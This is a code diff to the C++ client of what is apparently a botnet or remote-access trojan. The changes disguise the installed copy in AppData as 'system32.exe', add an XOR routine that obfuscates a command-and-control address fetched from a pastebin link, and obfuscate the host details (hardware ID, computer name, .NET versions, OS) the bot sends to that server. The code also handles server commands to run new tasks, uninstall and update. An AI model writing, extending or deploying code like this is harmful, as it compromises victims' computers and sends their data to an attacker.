@@ -256,7 +256,7 @@ std::string checkIfRegKeyExists(std::string key) {
 
 std::string installedOrnot() {
 	//Kill Current Place
-	std::string installPath = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\test2.exe";
+	std::string installPath = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\system32.exe";
 	//Check if Appdata Dir 
 	if (installPath != ExePath()) {
 		//Uninstalled Copy To AppData & Execute
@@ -276,28 +276,39 @@ std::string installedOrnot() {
 }
 
 
+std::string encryptDecrypt(std::string toEncrypt) {
+	char key[3] = { 'K', 'C', 'Q' }; //Any chars will work
+	std::string output = toEncrypt;
 
+	for (int i = 0; i < toEncrypt.size(); i++)
+		output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];
+
+	return output;
+
+}
 
 
 
 
 
 //int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
-int main(int argc, char *argv[]){
+int main(int argc, char *argv[]) {
 
-
+	/*
 	std::string insatlled = installedOrnot();
 	if (insatlled == "restart") {
 		std::cout << "restart program";
 		return 0;
 	}
 	addstartup();
+	*/
 
-	//std::cout << "UPDATED";
+	//std::cout << encryptDecrypt(getComputerName());
+	//std::cout << encryptDecrypt(encryptDecrypt(getComputerName()));
 	http::Request request("http://pastebin.com/raw/Yd76WVbu");
 	http::Response response = request.send("GET");
-	std::string gateFromPatebin = responseToString(response);
-
+	std::string gateFromPatebin = encryptDecrypt(responseToString(response));
+	//std::cout << gateFromPatebin;
 	std::string netFramework2 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
 	std::string netFramework3 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
 	std::string netFramework35 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
@@ -309,18 +320,22 @@ int main(int argc, char *argv[]){
 			http::Request request2(gateFromPatebin);
 			http::Response respons2e = request2.send("POST",
 				"hwid=" + getHWID() +
-				"&username=" + getComputerName() +
-				"&nf2=" + netFramework2 +
-				"&nf3=" + netFramework3 +
-				"&nf35=" + netFramework35 +
-				"&nf4=" + netFramework4 +
+				"&username=" + encryptDecrypt(getComputerName()) +
+				"&nf2=" + encryptDecrypt(netFramework2) +
+				"&nf3=" + encryptDecrypt(netFramework3) +
+				"&nf35=" + encryptDecrypt(netFramework35) +
+				"&nf4=" + encryptDecrypt(netFramework4) +
 				"&os=" + GetWindowsVersionString() +
-				"&botversion=2.0",
+				"&botversion=" + encryptDecrypt("2.0"),
 				{ "Content-Type: application/x-www-form-urlencoded" }
 			);
 			std::string responseFromGate = responseToString(respons2e);
 			//TODO Handle newtask Function
 			
+
+
+
+
 			std::string substring = "newtask";
 			if (responseFromGate.find(substring) != std::string::npos) {
 				std::vector<std::string> v = explode(";", responseFromGate);
@@ -344,12 +359,12 @@ int main(int argc, char *argv[]){
 					uninstall();
 					return 0;
 				}  else if (responseFromGate.find("update") != std::string::npos) {
-					std::cout << "Update Found";
+					std::cout << "Update Found  \n";
 					std::vector<std::string> v = explode(";", responseFromGate);
 					update(v[2]);
 					return 0;
 				}else {
-					std::cout << "No new Task";
+					std::cout << "No new Task \n";
 				}
 			}
 		}
